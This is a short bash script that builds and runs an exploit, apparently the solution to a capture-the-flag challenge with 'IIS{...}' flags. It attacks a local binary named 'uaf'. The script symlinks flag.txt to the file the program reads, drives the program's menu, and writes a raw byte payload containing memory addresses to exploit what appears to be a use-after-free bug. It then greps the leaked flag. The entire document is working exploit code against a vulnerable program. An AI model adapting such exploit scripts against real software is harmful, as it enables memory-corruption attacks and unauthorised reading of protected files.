#!/bin/bash

echo '#!/bin/bash' >> exploit_script.sh
echo 'rm food.txt 2> /dev/null' >> exploit_script.sh
echo 'ln -s flag.txt food.txt' >> exploit_script.sh
echo 'echo 4' >> exploit_script.sh
echo 'echo 1' >> exploit_script.sh
echo 'echo cow' >> exploit_script.sh
echo 'echo loc' >> exploit_script.sh
echo 'echo 3' >> exploit_script.sh
echo 'echo 0' >> exploit_script.sh
echo 'rm food.txt' >> exploit_script.sh
echo 'echo -en \\xb4\\xb0\\x16\\x08\\x00\\x00\\x00\\x00\\x58\\x3c\\x1e\\x08\\x33\\x33\\x33\\x31\\x32\\x33\\x33\\x33\\x31\\x32\\x33\\x33\\x33\\x31\\x32\\x33\\x33\\x33\\x31\\x32\\x33\\x33\\x33\\x31\\x32\\x33\\x33\\x33\\x31\\x32\\x33\\x33\\x33\\x31\\x32\\x33\\x6e\\x8d\\x04\\x08\\x00\\x00\\x00\\x00 > food.txt' >> exploit_script.sh
echo 'echo 4' >> exploit_script.sh
echo 'echo 6' >> exploit_script.sh
echo 'echo 0' >> exploit_script.sh
echo 'echo 7' >> exploit_script.sh
echo 'rm food.txt' >> exploit_script.sh
chmod +x exploit_script.sh

echo "execute the command: ./exploit_script.sh | ./uaf 56 food.txt | grep -a -E -o IIS\{.+\}"
./exploit_script.sh | ./uaf 56 food.txt | grep -a -E -o IIS\{.+\}
